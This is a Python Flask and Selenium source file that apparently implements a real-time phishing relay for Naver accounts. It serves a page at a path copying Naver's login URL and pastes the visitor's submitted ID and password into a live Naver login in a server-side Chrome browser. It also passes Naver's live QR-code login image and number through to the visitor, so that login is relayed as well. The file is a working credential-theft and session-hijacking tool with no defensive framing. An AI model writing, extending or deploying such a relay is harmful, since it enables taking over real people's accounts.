from logging import error
import clipboard
import chromedriver_autoinstaller
from flask import Flask, render_template, redirect, url_for, jsonify, request
from flask.helpers import get_template_attribute
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

app = Flask(__name__)

chromedriver = chromedriver_autoinstaller.install()
driver = webdriver.Chrome(chromedriver)

NAVER_LOGIN_URL = 'https://nid.naver.com/'
NAVER_LOGIN_FORMAT = ['https://nid.naver.com/nidlogin.login?mode=form', 'https://nid.naver.com/nidlogin.login?mode=number', 'https://nid.naver.com/nidlogin.login?mode=qrcode']

@app.route('/')
def index():
    return redirect('nidlogin.login')

@app.route('/nidlogin.login', methods=['GET', 'POST'])
def nidlogin():
    if request.method == 'GET':
        driver.get(NAVER_LOGIN_URL)
        return render_template('Login.html', display='none', error_msg='')
    elif request.method == 'POST':
        mode = request.form.get('mode')
        if mode == 'form':
            id = request.form.get('id')
            pw = request.form.get('pw')
            error_msg = login_form(id, pw)
            if error_msg != None:
                return render_template('Login.html', display='block', error_msg=error_msg)
            return 'Document form'
        elif mode == 'ones':
            return 'Document Ready'
        elif mode == 'qrcode':
            return 'Document Ready'

@app.route('/loinid')
def loinid():
    driver.get(NAVER_LOGIN_FORMAT[0])
    json = {"Status":"Success"}
    return jsonify(json)

@app.route('/ones')
def ones():
    driver.get(NAVER_LOGIN_FORMAT[1])
    json = {"Status":"Success"}
    return jsonify(json)

@app.route('/qrcode')
def qrcode():
    driver.get(NAVER_LOGIN_FORMAT[2])
    number = driver.execute_script('''
    return document.getElementsByClassName('point')[0].innerText;
    ''')
    qrImage = driver.execute_script('''
    return window.qrImage.getAttribute('src');
    ''')
    json = {"Status":"Success", "number":number, "qrImage":qrImage}
    return jsonify(json)

@app.route('/<path:path>')
def static_file(path):
    return app.send_static_file(path)

def login_form(id, pw):
    global driver
    clipboard.copy(id)
    driver.find_element_by_id('id').send_keys(Keys.CONTROL + 'v')
    clipboard.copy(pw)
    driver.find_element_by_id('pw').send_keys(Keys.CONTROL + 'v')
    driver.find_element_by_class_name('btn_login').click()

    if driver.current_url == 'https://nid.naver.com/nidlogin.login':
        msg = driver.execute_script('''
        return window.err_common.innerHTML;
        ''')
    else:
        msg = None
    return msg

def login_ones():
    return True

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, debug=False)